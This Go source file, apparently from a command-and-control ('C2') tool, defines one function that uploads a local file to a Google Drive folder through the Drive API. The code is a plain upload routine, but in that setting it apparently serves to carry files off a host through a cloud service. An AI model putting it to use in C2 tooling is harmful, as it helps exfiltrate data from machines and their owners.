package C2

import (
	"os"
	"path/filepath"

	"google.golang.org/api/drive/v3"
)

func uploadFile(clientDrive *drive.Service, localFilePath string, driveFolderId string) error {

	var parent []string
	parent = append(parent, driveFolderId)

	fileName := filepath.Base(localFilePath)

	f := &drive.File{
		Name:    fileName,
		DriveId: driveFolderId,
		Parents: parent,
	}

	file, _ := os.Open(localFilePath)

	_, err := clientDrive.Files.Create(f).Media(file).Do()

	return err

}
